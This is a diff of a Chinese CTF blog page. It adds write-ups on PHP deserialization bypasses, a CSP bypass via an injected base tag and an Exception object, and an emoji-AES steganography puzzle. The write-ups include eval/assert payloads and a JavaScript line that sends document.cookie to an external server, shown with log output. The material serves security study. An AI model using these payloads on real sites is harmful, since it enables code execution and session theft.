@@ -169,6 +169,231 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-php逃逸" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/08/php%E9%80%83%E9%80%B8/" class="article-date">
+  	<time datetime="2021-08-07T16:00:00.000Z" itemprop="datePublished">2021-08-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/08/php%E9%80%83%E9%80%B8/">
+        php逃逸
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php逃逸"><a href="#php逃逸" class="headerlink" title="php逃逸"></a>php逃逸</h1><p>查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$safe=&quot;Hack me!&quot;;</span><br><span class="line"></span><br><span class="line">class Hacker&#123;</span><br><span class="line">    public $name=&quot;var_dump&quot;;</span><br><span class="line">    public $msg=&quot;Happy to cjb&quot;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        global $safe;</span><br><span class="line">        if(preg_match(&#x27;/\d|\/|,|\([^()]*\([^()]*\)/&#x27;,$this-&gt;msg))&#123;</span><br><span class="line">            $this-&gt;name=&quot;var_dump&quot;;</span><br><span class="line">            $this-&gt;msg=&quot;You look dangerous!!!&quot;;</span><br><span class="line">            $safe=&quot;I think waf is enough.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        call_user_func($this-&gt;name,$this-&gt;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        global $safe;</span><br><span class="line">        var_dump($safe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第一种思路，可以利用shell来绕过，可构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_POST[&#x27;shell&#x27;])&amp;&amp;shell=写命令</span><br></pre></td></tr></table></figure>
+<p>来绕过，构造payload就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:22:&quot;eval($_POST[&#x27;shell&#x27;]);&quot;;&#125;&amp;&amp;shell=show_source(&quot;/you_never_know_my_name&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>第二种思路</p>
+<p>就是在类中写两次相同的属性名，后面的属性值会覆盖前面的属性值（注意：类的属性个数记得加1）</p>
+<p>第三种思路</p>
+<p>这里过滤了系统执行的函数，而又不知道flag的文件名，因此这里可以用assert绕过，但是这里的正则过滤了括号嵌套，而不用get或post很难进行输出<br>因此可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">global $safe;</span><br><span class="line">var_dump($safe);</span><br></pre></td></tr></table></figure>
+<p>来输出，所以可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看flag文件名</span><br><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:57:&quot;$safe=chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;)?scandir(&#x27;.&#x27;):&#x27;&#x27;&quot;;&#125;</span><br><span class="line"></span><br><span class="line">读flag文件</span><br><span class="line">info=O:6:&quot;Hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:8:&quot;var_dump&quot;;s:4:&quot;name&quot;;s:6:&quot;assert&quot;;s:3:&quot;msg&quot;;s:85:&quot;$safe=chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).chdir(&#x27;..&#x27;).file_get_contents(&#x27;you_never_know_my_name&#x27;)&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-ssl数字证书" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/08/ssl%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/" class="article-date">
+  	<time datetime="2021-08-07T16:00:00.000Z" itemprop="datePublished">2021-08-08</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/08/ssl%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/">
+        SSL数字证书
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SSL数字证书及原生类绕过"><a href="#SSL数字证书及原生类绕过" class="headerlink" title="SSL数字证书及原生类绕过"></a>SSL数字证书及原生类绕过</h1><p>通过F12查看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!isset($_GET[&#x27;user&#x27;])&amp;&amp;!isset($_GET[&#x27;username&#x27;])&amp;&amp;!isset($_GET[&#x27;source&#x27;])&amp;&amp;!isset($_GET[&#x27;query&#x27;]))&#123;</span><br><span class="line">    header(&quot;Location: ./?username=guest&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$test=md5(uniqid(&#x27;&#x27;,true));</span><br><span class="line">header(&quot;Content-Security-Policy:  script-src &#x27;strict-dynamic&#x27; &#x27;nonce-$test&#x27;; img-src &#x27;self&#x27;; style-src &#x27;self&#x27;;  font-src &#x27;self&#x27;; frame-src &#x27;none&#x27; &quot;);</span><br><span class="line">header ( &quot;Cache-Control: no-cache, must-revalidate &quot; );</span><br><span class="line">function getCurrentUrl()&#123;</span><br><span class="line">    $scheme = $_SERVER[&#x27;REQUEST_SCHEME&#x27;];</span><br><span class="line">    $domain = $_SERVER[&#x27;HTTP_HOST&#x27;];</span><br><span class="line">    $requestUri = $_SERVER[&#x27;REQUEST_URI&#x27;];</span><br><span class="line">    $currentUrl = $scheme . &quot;://&quot; . $domain . $requestUri;</span><br><span class="line">    return $currentUrl;</span><br><span class="line">&#125;</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if (is_string($this-&gt;username))&#123;</span><br><span class="line">            if (preg_match(&#x27;/script|&lt;|&gt;|onload|onerror/i&#x27;,$this-&gt;username))&#123;</span><br><span class="line">                die(&#x27;no xss&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;&lt;h1 id=&quot;username&quot;&gt;&#x27;.htmlentities(&#x27;welcome back &#x27;.$this-&gt;username).&#x27;&lt;/h1&gt;&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            echo &#x27;&lt;h1 id=&quot;username&quot;&gt;&#x27;.$this-&gt;username.&#x27;&amp;nbsp&amp;nbspis&amp;nbsp&amp;nbspnot&amp;nbsp&amp;nbspallowed,&amp;nbsp&amp;nbsponly&amp;nbsp&amp;nbspstring&#x27;.&#x27;&lt;/h1&gt;&#x27;;</span><br><span class="line">            file_put_contents(&#x27;admin.log&#x27;,$_GET[&#x27;user&#x27;]);   //admin will check who attacks him in /admin.php</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;source&#x27;]))&#123;</span><br><span class="line">    $text=file_get_contents(__FILE__);</span><br><span class="line">    echo $text;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;query&#x27;]))&#123;</span><br><span class="line">    //drive bot to visit your page</span><br><span class="line">    //source code : browser.get(&#x27;http://127.0.0.1/?&#x27;+sys.argv[1])</span><br><span class="line">    //query example:</span><br><span class="line">    //your url : httP://127.0.0.1/?username=guest</span><br><span class="line">    //query : username=guest</span><br><span class="line">    $text=escapeshellarg($_GET[&#x27;query&#x27;]);</span><br><span class="line">    #echo($text);</span><br><span class="line">    system(&#x27;python /var/xssbot/xssbot.py &#x27;.$text);</span><br><span class="line">    //sleep(3);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel=&#x27;stylesheet&#x27; href=&#x27;./css/stylesheet.css&#x27;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;&lt;!--?source=1--&gt;\n&quot;;</span><br><span class="line">echo &quot;&lt;body&gt;\n&quot;;</span><br><span class="line">if (isset($_GET[&#x27;user&#x27;]))&#123;</span><br><span class="line">    unserialize(urldecode(base64_decode($_GET[&#x27;user&#x27;])));</span><br><span class="line">&#125;</span><br><span class="line">else if(isset($_GET[&#x27;username&#x27;]))&#123;</span><br><span class="line">    echo &#x27;&lt;h1 id=&quot;username&quot;&gt;&#x27;.htmlentities(&#x27;hello &#x27;.$_GET[&#x27;username&#x27;]).&#x27;&lt;/h1&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &#x27;&lt;div id=&quot;particles-js&quot;&gt;&lt;/div&gt;&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/jquery-1.12.0.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/particles.min.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/app.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line"> &quot;;</span><br><span class="line">echo &quot;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>通过对代码的审计，可知有两层的绕过，第一层是is_string()的绕过，可以使用原生类Exception()来绕过</p>
+<p>绕过第一层后，我们可以发现CSP(SSL数字证书）:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src&#x27;strict-dynamic&#x27;&#x27;nonce-$test&#x27;;</span><br></pre></td></tr></table></figure>
+<p>通过uniqid，nonce是不可知的，因此我们发现一串代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/jquery-1.12.0.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/particles.min.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script nonce=&#x27;$test&#x27; src=&#x27;./js/app.js&#x27;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>因此我们可以通过<base>修改自己的服务器的地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base href=&quot;//xx.xx.xx.xx:22222&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>结合起来，可以得到一个exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">&#125;</span><br><span class="line">$user=new user();</span><br><span class="line">$user-&gt;username=new Exception(&#x27;&lt;base href=&quot;//xx.xx.xx.xx:22222&quot;&gt;&#x27;);</span><br><span class="line">echo base64_encode(serialize($user));</span><br></pre></td></tr></table></figure>
+
+<p>然后我们利用ubuntu来创建一个./js/app.js文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@VM-4-10-ubuntu:~# cat ./js/app.js </span><br><span class="line">window.open(&#x27;http://xx.xx.xx.xx:22222/&#x27;+document.cookie)</span><br></pre></td></tr></table></figure>
+
+<p>构造payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=user=&lt;base64代码&gt;</span><br></pre></td></tr></table></figure>
+<p>我们可以得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">49.235.148.38 - - [14/Jul/2021 13:36:29] &quot;GET /js/particles.min.js HTTP/1.1&quot; 404 -</span><br><span class="line">49.235.148.38 - - [14/Jul/2021 13:36:29] code 404, message File not found</span><br><span class="line">49.235.148.38 - - [14/Jul/2021 13:36:29] &quot;GET /flag=ctfshow%7Bc4580781-d9de-449f-a8ec-f79c6464f037%7D%0A HTTP/1.1&quot; 404 -</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-表情包加密" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/01/%E8%A1%A8%E6%83%85%E5%8C%85%E5%8A%A0%E5%AF%86/" class="article-date">
+  	<time datetime="2021-07-31T16:00:00.000Z" itemprop="datePublished">2021-08-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/01/%E8%A1%A8%E6%83%85%E5%8C%85%E5%8A%A0%E5%AF%86/">
+        表情包解密及MP3文件分析
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MP3文件的分离及表情包和winding的解密"><a href="#MP3文件的分离及表情包和winding的解密" class="headerlink" title="MP3文件的分离及表情包和winding的解密"></a>MP3文件的分离及表情包和winding的解密</h1><h2 id="蓝帽杯（冬奥）"><a href="#蓝帽杯（冬奥）" class="headerlink" title="蓝帽杯（冬奥）"></a>蓝帽杯（冬奥）</h2><p>下载文件，发现是一张图片，此时用kali的binwalk进行分离，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 文件名称</span><br></pre></td></tr></table></figure>
+<p>发现有rar文件、MP3文件及zip文件，之后发现zip文件无用，然后用kali的MP3Stego对mp3文件进行解密，密码猜测为冬奥会举办时间</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解密：</span><br><span class="line">decode.exe -P 密码 文件及路径</span><br><span class="line"></span><br><span class="line">加密：</span><br><span class="line">encode.exe -P 密码 文件及路径</span><br></pre></td></tr></table></figure>
+<p>然后发现有一串\x的数字，按特征，是utf-8编码，因此可以使用脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding=utf-8</span><br><span class="line">print(b&quot;\xe2\x9c\x8c\xef\xb8\x8e \xe2\x98\x9d\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x98\x9f\xef\xb8\x8e\xe2\x97\x86\xef\xb8\x8e\xe2\x99\x8c\xef\xb8\x8e \xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x97\xbb\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xe2\x9d\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8e\xef\xb8\x8e \xf0\x9f\x93\x82\xef\xb8\x8e\xe2\x99\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xf0\x9f\x8f\xb1\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x93\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e \xe2\x9d\x96\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x91\xef\xb8\x8e\xf0\x9f\x93\xac\xef\xb8\x8e \xf0\x9f\x95\x88\xef\xb8\x8e\xe2\x99\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5\xe2\x99\x8f\xef\xb8\x8e \xe2\x99\x8b\xef\xb8\x8e \xe2\x97\x8f\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x8b\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x9c\x8d\xef\xb8\x8e&quot;.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>
+<p>可以得到一串符号(注意要在pycharm中运行，命令行会有乱码）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">✌︎ ☝︎♓︎⧫︎☟︎◆︎♌︎ ❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎ ■︎♋︎❍︎♏︎♎︎ 📂︎♍︎♏︎🏱︎♏︎♋︎🙵 ♓︎⬧︎ ❖︎♏︎❒︎⍓︎ ♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎ 🕈︎♒︎⍓︎ ■︎□︎⧫︎ ⧫︎♋︎🙵♏︎ ♋︎ ●︎□︎□︎🙵 ♋︎⧫︎ ♓︎⧫︎✍︎</span><br></pre></td></tr></table></figure>
+<p>看特征是winding编码，因此可以使用<a target="_blank" rel="noopener" href="https://lingojam.com/WingdingsTranslator%E8%BF%9B%E8%A1%8C%E5%9C%A8%E7%BA%BF%E8%A7%A3%E7%A0%81%EF%BC%8C%E5%BE%97%E5%88%B0">https://lingojam.com/WingdingsTranslator进行在线解码，得到</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A︎ G︎i︎t︎H︎u︎b︎ r︎e︎p︎o︎s︎i︎t︎o︎r︎y︎ n︎a︎m︎e︎d︎ 1︎c︎e︎P︎e︎a︎k i︎s︎ v︎e︎r︎y︎ i︎n︎t︎e︎r︎e︎s︎t︎i︎n︎g︎.︎ W︎h︎y︎ n︎o︎t︎ t︎a︎ke︎ a︎ l︎o︎o︎k </span><br></pre></td></tr></table></figure>
+<p>可以知道只要在github搜索1cePeak即可得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo How_6ad_c0uld_a_1cePeak_be? &gt;&amp;2</span><br></pre></td></tr></table></figure>
+<p>之后将rar放进winhex中，发现chiper，因此可以进行hex解码，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆🎃✅⌨🔪❓🚫🐍🙃🔬✉👁😆🎈🐘🏎🐘🐘😂😎🎅🖐🐍✉🍌🌪🐎🍵✅🚪✖☃👣👉ℹ🔪🍎🔄👣🚪😁👣💵🐅🍵🔬🛩😇🖐🖐🎅✅🏎👌🚨😆🎤🎅🦓🌿🦓🙃✖🍌🛩😂👑🌏☃😇😍🛩🚹😀🍌🎈💧🗒🗒</span><br></pre></td></tr></table></figure>
+<p>这是表情包+aes加密，因此可以使用<a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BA%E5%89%8D%E9%9D%A2mp3%E6%96%87%E4%BB%B6%E4%B8%AD%E6%89%BE%E5%88%B0%E7%9A%84How_6ad_c0uld_a_1cePeak_be">https://aghorler.github.io/emoji-aes/进行解密，密码为前面mp3文件中找到的How_6ad_c0uld_a_1cePeak_be</a>?</p>
+<h2 id="巅峰极客（签到）"><a href="#巅峰极客（签到）" class="headerlink" title="巅峰极客（签到）"></a>巅峰极客（签到）</h2><p>打开文件，发现表情包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🥋🐘🍴🚰😍☀🌿😇😍😡🏎👉🛩🤣🖐💧☺🌉🏎😇😆🎈💧⏩☺🔄🌪⌨🐅🎅🙃🍌🙃🔪☂🏹🕹☃🌿🌉💵🐎🐍😇🍵😍🐅🎈🥋🚰✅🎈🎈</span><br></pre></td></tr></table></figure>
+<p>且题目说给GAME，因此使用<a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAGAME">https://aghorler.github.io/emoji-aes/解密，密码为GAME</a>
+ </p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-双写绕过(时间注入)" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -805,197 +1030,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-ACTF2020 新生赛(Include文件包含）" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B(Include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B(Include%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89/">
-        ACTF2020 新生赛(Include文件包含）
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="include函数的文件包含"><a href="#include函数的文件包含" class="headerlink" title="include函数的文件包含"></a>include函数的文件包含</h2><h2 id="include函数"><a href="#include函数" class="headerlink" title="include函数"></a>include函数</h2><p>include函数是包含并运行指定的文件，如果有看到?file=，则一般要先想到include函数的文件包含，而且一般和伪协议一起使用</p>
-<p>##实例<br>看到?file=，且题目提示include函数，因此可以想到文件包含和伪协议的联合使用</p>
-<p>因此可以构造payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=conver.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<p>![ACTF2020 新生赛1](<a target="_blank" rel="noopener" href="https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020">https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ACTF2020</a> 新生赛1.jpg)</p>
-<p>可以看到出现base64编码的数，然后进行解码即可得到flag</p>
